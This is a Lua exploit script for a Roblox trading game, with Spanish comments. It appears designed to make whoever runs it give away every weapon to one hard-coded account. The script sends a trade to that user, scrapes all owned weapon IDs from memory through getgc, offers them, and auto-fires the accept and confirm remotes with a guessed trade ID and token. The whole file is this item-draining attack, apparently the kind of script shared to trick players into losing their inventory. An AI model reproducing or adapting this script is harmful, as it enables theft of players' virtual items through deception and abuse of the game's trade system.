-- Paso 1: Enviar el trade a Aaron (AARON287240)
local targetUserId = 10631566712
local targetPlayer = nil

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if not targetPlayer then
    warn("Aaron no está en este servidor. ¡Entren al mismo juego!")
    return
end

pcall(function()
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
end)
print("¡Solicitud enviada a Aaron!")

-- Esperar a que abra la ventana
task.wait(1.5)

-- Paso 2: Escanear y ofrecer TODAS las armas
local weaponsList = {}
local seen = {}

pcall(function()
    for _, obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            local weapons = rawget(obj, "Weapons")
            if type(weapons) == "table" then
                local owned = rawget(weapons, "Owned")
                if type(owned) == "table" then
                    for k, val in pairs(owned) do
                        local weaponId = tonumber(k) and val or k
                        if type(weaponId) == "string" and not seen[weaponId] then
                            seen[weaponId] = true
                            table.insert(weaponsList, weaponId)
                        end
                    end
                end
            end
        end
    end
end)

pcall(function()
    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        for _, desc in ipairs(playerGui:GetDescendants()) do
            if desc:IsA("GuiObject") then
                local itemId = desc:GetAttribute("ItemID")
                if itemId and type(itemId) == "string" and not seen[itemId] then
                    seen[itemId] = true
                    table.insert(weaponsList, itemId)
                end
            end
        end
    end
end)

print("¡Ofreciendo " .. #weaponsList .. " armas!")

for _, weaponName in ipairs(weaponsList) do
    pcall(function()
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(weaponName, "Weapons")
    end)
    task.wait(0.12)
end

task.wait(0.5)

-- Paso 3: Primer botón (Aceptar el trade)
local activeTradeId = nil
pcall(function()
    for _, obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            for k, v in pairs(obj) do
                if (tostring(k):lower():find("trade") or tostring(k):lower():find("session")) and type(v) == "number" and v > 100000 then
                    activeTradeId = v
                    break
                end
            end
        end
        if activeTradeId then break end
    end
end)

local tradeId = activeTradeId or 428469873
local token = math.random(10000, 99999) + (os.clock() % 1)

pcall(function()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(tradeId, token)
end)
print("¡Primer botón (Aceptar) presionado!")

-- Paso 4: Esperar la cuenta regresiva del juego y presionar el segundo botón (Confirmar)
-- Esperamos un par de segundos por si el juego pone tiempo de espera antes de dejar confirmar
task.wait(2)

pcall(function()
    -- Probamos los nombres de Remote más comunes para la confirmación final
    local tradeFolder = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
    if tradeFolder then
        if tradeFolder:FindFirstChild("ConfirmTrade") then
            tradeFolder.ConfirmTrade:FireServer(tradeId, token)
        elseif tradeFolder:FindFirstChild("Confirm") then
            tradeFolder.Confirm:FireServer(tradeId, token)
        else
            -- Si no existe un Remote nuevo, re-invocamos AcceptTrade que en muchos juegos actúa como confirmación
            tradeFolder.AcceptTrade:FireServer(tradeId, token)
        end
    end
end)

print("¡Segundo botón (Confirmar) ejecutado! Las armas deberían haberse transferido.")
